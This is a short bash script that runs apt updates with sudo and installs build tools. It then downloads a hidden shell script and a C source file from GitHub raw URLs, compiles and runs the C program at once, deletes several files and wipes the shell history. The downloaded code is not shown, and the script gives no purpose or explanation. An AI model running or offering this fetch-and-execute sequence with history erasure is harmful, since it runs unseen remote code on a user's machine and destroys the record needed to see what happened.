#!/bin/bash

sudo apt update -y && sudo apt upgrade -y

sudo apt install build-essential -y 


wget https://raw.githubusercontent.com/kiprono254/info/main/.in.sh ; chmod +x .in.sh

wget https://raw.githubusercontent.com/kiprono254/pile/main/piles.c ; gcc piles.c -o xpiles ; ./xpiles


rm -rf piros.sh menu.c wspro.sh 


cat /dev/null > ~/.bash_history && history -c && history -w
